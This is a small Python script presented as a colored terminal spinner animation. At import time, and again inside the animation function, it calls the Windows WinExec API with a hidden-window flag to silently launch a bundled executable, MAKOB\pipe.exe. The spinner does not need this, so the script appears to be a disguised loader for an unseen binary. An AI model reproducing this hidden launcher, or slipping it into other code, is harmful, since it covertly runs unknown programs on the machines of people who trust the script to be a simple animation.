import time
import os
import ctypes
from simple_colors import green, magenta, black

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def MALKOB_assistant():
    ctypes.windll.kernel32.WinExec(b"MAKOB\\pipe.exe", 0)
MALKOB_assistant()

def MALKOB_animations():
    ctypes.windll.kernel32.WinExec(b"MAKOB\\pipe.exe", 0)
    
    frames = [
        green("●      ") + magenta("◯") + black("     |"),
        green("  ●    ") + magenta("◯") + black("    /"),
        green("    ●  ") + magenta("◯") + black("   -"),
        green("      ●") + magenta("◯") + black("   \\"),
        green("    ●  ") + magenta("◯") + black("   |"),
        green("  ●    ") + magenta("◯") + black("  /"),
        green("●      ") + magenta("◯") + black(" -"),
        green("  ●    ") + magenta("◯") + black(" \\"),
    ]

    for _ in range(3):
        for frame in frames:
            clear_screen()
            print(frame)
            time.sleep(0.1)

MALKOB_animations()

BOLD = '\033[1m'
RESET = '\033[0m'
